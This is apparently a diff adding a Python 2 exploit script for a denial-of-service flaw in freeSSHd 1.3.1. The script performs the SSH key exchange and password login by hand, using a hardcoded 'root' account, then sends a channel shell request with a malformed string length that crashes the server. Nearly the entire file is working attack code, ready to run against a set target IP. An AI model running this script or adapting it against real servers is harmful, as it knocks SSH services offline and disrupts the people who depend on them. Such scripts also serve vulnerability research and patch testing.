@@ -1,0 +1,515 @@
+'''
+# Exploit title: freesshd 1.3.1 denial of service vulnerability
+# Date: 28-8-2015
+# Vendor homepage: http://www.freesshd.com
+# Software Link: http://www.freesshd.com/freeSSHd.exe
+# Version: 1.3.1
+# Author: 3unnym00n
+ 
+# Details:
+# ----------------------------------------------
+#           byte      SSH_MSG_CHANNEL_REQUEST
+#           uint32    recipient channel
+#           string    "shell"
+#           boolean   want reply
+
+# freeSSHd doesn't correctly handle channel shell request, when the "shell" length malformed can lead crashing
+ 
+# Tested On: win7, xp
+# operating steps: 
+    1. in the freeSSHd settings: add a user, named "root", password is "fuckinA"
+    2. restart the server to let the configuration take effect
+    3. modify the hostname in this py.
+    4. running the py, u will see the server crash
+    
+    
+# remark: u can also modify the user auth service request packet, to adjust different user, different password
+
+ 
+'''
+
+import socket
+import struct
+import os
+from StringIO import StringIO
+from hashlib import sha1
+from Crypto.Cipher import Blowfish, AES, DES3, ARC4
+from Crypto.Util import Counter
+from hmac import HMAC
+
+## suppose server accept our first dh kex: diffie-hellman-group14-sha1
+P = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
+G = 2
+__sequence_number_out = 3
+
+zero_byte = chr(0)
+one_byte = chr(1)
+four_byte = chr(4)
+max_byte = chr(0xff)
+cr_byte = chr(13)
+linefeed_byte = chr(10)
+crlf = cr_byte + linefeed_byte
+
+class Message (object):
+    """
+    An SSH2 message is a stream of bytes that encodes some combination of
+    strings, integers, bools, and infinite-precision integers (known in Python
+    as longs).  This class builds or breaks down such a byte stream.
+
+    Normally you don't need to deal with anything this low-level, but it's
+    exposed for people implementing custom extensions, or features that
+    paramiko doesn't support yet.
+    """
+
+    big_int = long(0xff000000)
+
+    def __init__(self, content=None):
+        """
+        Create a new SSH2 message.
+
+        :param str content:
+            the byte stream to use as the message content (passed in only when
+            decomposing a message).
+        """
+        if content is not None:
+            self.packet = StringIO(content)
+        else:
+            self.packet = StringIO()
+
+    def __str__(self):
+        """
+        Return the byte stream content of this message, as a string/bytes obj.
+        """
+        return self.asbytes()
+
+    def __repr__(self):
+        """
+        Returns a string representation of this object, for debugging.
+        """
+        return 'paramiko.Message(' + repr(self.packet.getvalue()) + ')'
+
+    def asbytes(self):
+        """
+        Return the byte stream content of this Message, as bytes.
+        """
+        return self.packet.getvalue()
+
+    
+    def add_bytes(self, b):
+        """
+        Write bytes to the stream, without any formatting.
+
+        :param str b: bytes to add
+        """
+        self.packet.write(b)
+        return self
+
+    def add_byte(self, b):
+        """
+        Write a single byte to the stream, without any formatting.
+
+        :param str b: byte to add
+        """
+        self.packet.write(b)
+        return self
+
+    def add_boolean(self, b):
+        """
+        Add a boolean value to the stream.
+
+        :param bool b: boolean value to add
+        """
+        if b:
+            self.packet.write(one_byte)
+        else:
+            self.packet.write(zero_byte)
+        return self
+
+    def add_size(self, n):
+        """
+        Add an integer to the stream.
+
+        :param int n: integer to add
+        """
+        self.packet.write(struct.pack('>I', n))
+        return self
+
+    def add_int(self, n):
+        """
+        Add an integer to the stream.
+
+        :param int n: integer to add
+        """
+        if n >= Message.big_int:
+            self.packet.write(max_byte)
+            self.add_string(deflate_long(n))
+        else:
+            self.packet.write(struct.pack('>I', n))
+        return self
+
+    def add_int(self, n):
+        """
+        Add an integer to the stream.
+
+        @param n: integer to add
+        @type n: int
+        """
+        if n >= Message.big_int:
+            self.packet.write(max_byte)
+            self.add_string(deflate_long(n))
+        else:
+            self.packet.write(struct.pack('>I', n))
+        return self
+
+    def add_int64(self, n):
+        """
+        Add a 64-bit int to the stream.
+
+        :param long n: long int to add
+        """
+        self.packet.write(struct.pack('>Q', n))
+        return self
+
+    def add_mpint(self, z):
+        """
+        Add a long int to the stream, encoded as an infinite-precision
+        integer.  This method only works on positive numbers.
+
+        :param long z: long int to add
+        """
+        self.add_string(deflate_long(z))
+        return self
+
+    def add_string(self, s):
+        """
+        Add a string to the stream.
+
+        :param str s: string to add
+        """
+        self.add_size(len(s))
+        self.packet.write(s)
+        return self
+
+    def add_list(self, l):
+        """
+        Add a list of strings to the stream.  They are encoded identically to
+        a single string of values separated by commas.  (Yes, really, that's
+        how SSH2 does it.)
+
+        :param list l: list of strings to add
+        """
+        self.add_string(','.join(l))
+        return self
+
+    def _add(self, i):
+        if type(i) is bool:
+            return self.add_boolean(i)
+        elif isinstance(i, int):
+            return self.add_int(i)
+        elif type(i) is list:
+            return self.add_list(i)
+        else:
+            return self.add_string(i)
+
+    def add(self, *seq):
+        """
+        Add a sequence of items to the stream.  The values are encoded based
+        on their type: str, int, bool, list, or long.
+
+        .. warning::
+            Longs are encoded non-deterministically.  Don't use this method.
+
+        :param seq: the sequence of items
+        """
+        for item in seq:
+            self._add(item)
+
+
+def deflate_long(n, add_sign_padding=True):
+    """turns a long-int into a normalized byte string (adapted from Crypto.Util.number)"""
+    # after much testing, this algorithm was deemed to be the fastest
+    s = bytes()
+    n = long(n)
+    while (n != 0) and (n != -1):
+        s = struct.pack('>I', n & long(0xffffffff)) + s
+        n >>= 32
+    # strip off leading zeros, FFs
+    for i in enumerate(s):
+        if (n == 0) and (i[1] != chr(0)):
+            break
+        if (n == -1) and (i[1] != chr(0xff)):
+            break
+    else:
+        # degenerate case, n was either 0 or -1
+        i = (0,)
+        if n == 0:
+            s = chr(0)
+        else:
+            s = chr(0xff)
+    s = s[i[0]:]
+    if add_sign_padding:
+        if (n == 0) and (ord(s[0]) >= 0x80):
+            s = chr(0) + s
+        if (n == -1) and (ord(s[0]) < 0x80):
+            s = chr(0xff) + s
+    return s
+
+def inflate_long(s, always_positive=False):
+    """turns a normalized byte string into a long-int (adapted from Crypto.Util.number)"""
+    out = long(0)
+    negative = 0
+    if not always_positive and (len(s) > 0) and (ord(s[0]) >= 0x80):
+        negative = 1
+    if len(s) % 4:
+        filler = chr(0)
+        if negative:
+            filler = chr(0xff)
+        # never convert this to ``s +=`` because this is a string, not a number
+        # noinspection PyAugmentAssignment
+        s = filler * (4 - len(s) % 4) + s
+    for i in range(0, len(s), 4):
+        out = (out << 32) + struct.unpack('>I', s[i:i+4])[0]
+    if negative:
+        out -= (long(1) << (8 * len(s)))
+    return out
+
+def byte_mask(c, mask):
+    return chr(ord(c) & mask)
+
+
+
+
+def _compute_key(K, H, session_id, id, nbytes):
+    """id is 'A' - 'F' for the various keys used by ssh"""
+    m = Message()
+    m.add_mpint(K)
+    m.add_bytes(H)
+    m.add_byte(str(id))
+    m.add_bytes(session_id)
+    out = sofar = sha1(m.asbytes()).digest()
+    while len(out) < nbytes:
+        m = Message()
+        m.add_mpint(K)
+        m.add_bytes(H)
+        m.add_bytes(sofar)
+        digest = sha1(m.asbytes()).digest()
+        out += digest
+        sofar += digest
+    return out[:nbytes]
+
+
+def compute_hmac(key, message, digest_class):
+    return HMAC(key, message, digest_class).digest()
+
+
+def read_msg(sock, block_engine_in, block_size, mac_size):
+    header = sock.recv(block_size)
+    header = block_engine_in.decrypt(header)
+    packet_size = struct.unpack('>I', header[:4])[0]
+    leftover = header[4:]
+    buf = sock.recv(packet_size + mac_size - len(leftover))
+    packet = buf[:packet_size - len(leftover)]
+    post_packet = buf[packet_size - len(leftover):]
+    packet = block_engine_in.decrypt(packet)
+    packet = leftover + packet
+
+def send_msg(sock, raw_data, block_engine_out, mac_engine_out, mac_key_out, mac_size):
+    global __sequence_number_out
+    out = block_engine_out.encrypt(raw_data)
+
+    payload = struct.pack('>I', __sequence_number_out) + raw_data
+    out += compute_hmac(mac_key_out, payload, mac_engine_out)[:mac_size]
+    sock.send(out)
+    __sequence_number_out += 1
+
+def exploit(hostname, port):
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((hostname, port))
+
+    ## send client banner
+    client_banner = 'SSH-2.0-SUCK\r\n'
+    sock.send(client_banner)
+    ## recv server banner
+    server_banner = ''
+    while True:
+        data = sock.recv(1)
+        if data == '\x0a':
+            break
+        server_banner += data
+
+    print 'server banner is: ', server_banner.__repr__()
+
+    ## do key exchange
+    ## send client algorithms
+    cookie = os.urandom(16)
+
+
+    client_kex = '000001cc0514'.decode('hex') + cookie + '000000596469666669652d68656c6c6d616e2d67726f757031342d736861312c6469666669652d68656c6c6d616e2d67726f75702d65786368616e67652d736861312c6469666669652d68656c6c6d616e2d67726f7570312d73686131000000237373682d7273612c7373682d6473732c65636473612d736861322d6e69737470323536000000576165733132382d6374722c6165733235362d6374722c6165733132382d6362632c626c6f77666973682d6362632c6165733235362d6362632c336465732d6362632c617263666f75723132382c617263666f7572323536000000576165733132382d6374722c6165733235362d6374722c6165733132382d6362632c626c6f77666973682d6362632c6165733235362d6362632c336465732d6362632c617263666f75723132382c617263666f75723235360000002b686d61632d736861312c686d61632d6d64352c686d61632d736861312d39362c686d61632d6d64352d39360000002b686d61632d736861312c686d61632d6d64352c686d61632d736861312d39362c686d61632d6d64352d3936000000046e6f6e65000000046e6f6e65000000000000000000000000000000000000'.decode('hex')
+    sock.send(client_kex)
+    client_kex_init = client_kex[5:-5]
+
+
+    ## recv server algorithms
+    server_kex = ''
+    str_pl = sock.recv(4)
+    pl = struct.unpack('>I', str_pl)[0]
+    tmp = sock.recv(pl)
+    padding_len = ord(tmp[0])
+    server_kex_init = tmp[1:-padding_len]
+
+    ## do dh kex
+    ## send client dh kex
+    x = 2718749950853797850634218108087830670950606437648125981418769990607126772940049948484122336910062802584089370382091267133574445173294378254000629897200925498341633999513190035450218329607097225733329543524028305346861620006860852918487068859161361831623421024322904154569598752827192453199975754781944810347
+    e = 24246061990311305114571813286712069338300342406114182522571307971719868860460945648993499340734221725910715550923992743644801884998515491806836377726946636968365751276828870539451268214005738703948104009998575652199698609897222885198283575698226413251759742449790092874540295563182579030702610986594679727200051817630511413715723789617829401744474112405554024371460263485543685109421717171156358397944976970310869333766947439381332202584288225313692797532554689171177447651177476425180162113468471927127194797168639270094144932251842745747512414228391665092351122762389774578913976053048427148163469934452204474329639
+    client_dh_kex = '0000010c051e0000010100c010d8c3ea108d1915c9961f86d932f3556b82cd09a7e1d24c88f7d98fc88b19ca3908cada3244dfc5534860b967019560ce5ee243007d41ecf68e9bfa7631847ecb1091558fd7ffe2f17171115690a6d10f3b62c317157ced9291770cc452cc93fb911f18de644ef988c09a3bff35770e99d1546d31c320993f8c12bb275cd2742afc547a0f3309c29a6e72611af965b6144b837ca2003c3ca1f3e35797ab143669b9034c575794c645383519d485a133e67d0793097ef08b72523fa3199c35358676d1fd9776248cae08e46da6414d0f975ffa4b4c84f69db86c47401808daa8a5919fc52ebed157b99e0dd2a4203f0c9e06d6395fa5c9b38a7ae8b159ea270000000000'.decode('hex')
+    sock.send(client_dh_kex)
+
+    ## recv server dh kex
+    str_pl = sock.recv(4)
+    pl = struct.unpack('>I', str_pl)[0]
+    server_dh_kex = sock.recv(pl)
+
+    ## send client newkeys
+    client_newkeys = '0000000c0a1500000000000000000000'.decode('hex')
+    sock.send(client_newkeys)
+
+    ## recv server newkeys
+    str_pl = sock.recv(4)
+    pl = struct.unpack('>I', str_pl)[0]
+    server_new_keys = sock.recv(pl)
+
+
+    ## calc all we need ...
+    host_key_len = struct.unpack('>I', server_dh_kex[2:6])[0]
+    # print host_key_len
+    host_key = server_dh_kex[6:6 + host_key_len]
+
+    f_len = struct.unpack('>I', server_dh_kex[6 + host_key_len:10 + host_key_len])[0]
+    str_f = server_dh_kex[10 + host_key_len:10 + host_key_len + f_len]
+    dh_server_f = inflate_long(str_f)
+
+    sig_len = struct.unpack('>I', server_dh_kex[10 + host_key_len + f_len:14 +  host_key_len + f_len])[0]
+    sig = server_dh_kex[14 +  host_key_len + f_len:14 +  host_key_len + f_len + sig_len]
+
+    K = pow(dh_server_f, x, P)
+    ## build up the hash H of (V_C || V_S || I_C || I_S || K_S || e || f || K), aka, session id
+    hm = Message()
+
+    hm.add(client_banner.rstrip(), server_banner.rstrip(),
+           client_kex_init, server_kex_init)
+
+    hm.add_string(host_key)
+    hm.add_mpint(e)
+    hm.add_mpint(dh_server_f)
+    hm.add_mpint(K)
+
+    H = sha1(hm.asbytes()).digest()
+
+    ## suppose server accept our first cypher: aes128-ctr, hmac-sha1
+    block_size = 16
+    key_size = 16
+    mac_size = 20
+
+    IV_out = _compute_key(K, H, H, 'A', block_size)
+    key_out = _compute_key(K, H, H, 'C', key_size)
+
+    block_engine_out = AES.new(key_out, AES.MODE_CTR, IV_out, Counter.new(nbits=block_size * 8, initial_value=inflate_long(IV_out, True)))
+    mac_engine_out = sha1
+    mac_key_out = _compute_key(K, H, H, 'E', mac_engine_out().digest_size)
+
+    IV_in = _compute_key(K, H, H, 'B', block_size)
+    key_in = _compute_key(K, H, H, 'D', key_size)
+    block_engine_in = AES.new(key_in, AES.MODE_CTR, IV_in, Counter.new(nbits=block_size * 8, initial_value=inflate_long(IV_in, True)))
+    mac_engine_in = sha1
+    mac_key_in = _compute_key(K, H, H, 'F', mac_engine_in().digest_size)
+
+    ## do user auth
+    ## send client service request (user auth)
+    client_service_request = '\x00\x00\x00\x1C\x0A\x05\x00\x00\x00\x0C\x73\x73\x68\x2D\x75\x73\x65\x72\x61\x75\x74\x68\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+    ## encrypt the packet
+    send_msg(sock, client_service_request, block_engine_out, mac_engine_out, mac_key_out, mac_size)
+
+
+    ## recv server service accept
+    read_msg(sock, block_engine_in, block_size, mac_size)
+
+    ## send client userauth request
+    client_userauth_request = '\x00\x00\x00\x3C\x08\x32'
+    ## the user name length and username
+    client_userauth_request += '\x00\x00\x00\x04'
+    client_userauth_request += 'root'
+
+    ## service
+    client_userauth_request += '\x00\x00\x00\x0E'
+    client_userauth_request += 'ssh-connection'
+
+    ## password
+    client_userauth_request += '\x00\x00\x00\x08'
+    client_userauth_request += 'password'
+    client_userauth_request += '\x00'
+
+    ## plaintext password fuckinA
+    client_userauth_request += '\x00\x00\x00\x07'
+    client_userauth_request += 'fuckinA'
+
+    ## padding
+    client_userauth_request += '\x00'*8
+
+    ## encrypt the packet
+    print 'send client_userauth_request'
+    send_msg(sock, client_userauth_request, block_engine_out, mac_engine_out, mac_key_out, mac_size)
+    # out = block_engine_out.encrypt(client_userauth_request)
+    # payload = struct.pack('>I', __sequence_number_out) + client_userauth_request
+    # out += compute_hmac(mac_key_out, payload, mac_engine_out)[:mac_size]
+    # sock.send(out)
+
+
+    ## recv server userauth success
+    print 'recv  server userauth success'
+    read_msg(sock, block_engine_in, block_size, mac_size)
+
+
+    ## begin send malformed data
+    ## send channel open
+    client_channel_open = '\x00\x00\x00\x2c\x13\x5a\x00\x00\x00\x07session\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x80\x00' + '\x00'*0x13
+
+
+    print 'send client_channel_open'
+    send_msg(sock, client_channel_open, block_engine_out, mac_engine_out, mac_key_out, mac_size)
+
+    ## recv channel open success
+    # print 'recv channel open success'
+    read_msg(sock, block_engine_in, block_size, mac_size)
+
+    ## send client channel request
+    client_channel_request = '\x00\x00\x00\x3c\x0d\x62\x00\x00\x00\x00\x00\x00\x00\x07pty-req\x01\x00\x00\x00\x05vt100\x00\x00\x00\x50\x00\x00\x00\x18' \
+                             '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + '\x00'*0x0d
+
+
+    print 'send client_channel_request'
+    send_msg(sock, client_channel_request, block_engine_out, mac_engine_out, mac_key_out, mac_size)
+
+    ## recv server pty success
+    # print 'recv server pty success'
+    read_msg(sock, block_engine_in, block_size, mac_size)
+
+
+    ## send client shell request
+    client_shell_request = '\x00\x00\x00\x1c\x0c\x62\x00\x00\x00\x00'
+    client_shell_request += '\x6a\x0b\xd8\xdashell'  # malformed
+    client_shell_request += '\x01'
+    client_shell_request += '\x00'*0x0c
+
+    print 'send client_shell_request'
+    send_msg(sock, client_shell_request, block_engine_out, mac_engine_out, mac_key_out, mac_size)
+    # print 'recv server shell success'
+    # read_msg(sock, block_engine_in, block_size, mac_size)
+
+
+
+if __name__ == '__main__':
+
+    hostname = '192.168.242.128'
+    port = 22
+    exploit(hostname, port)
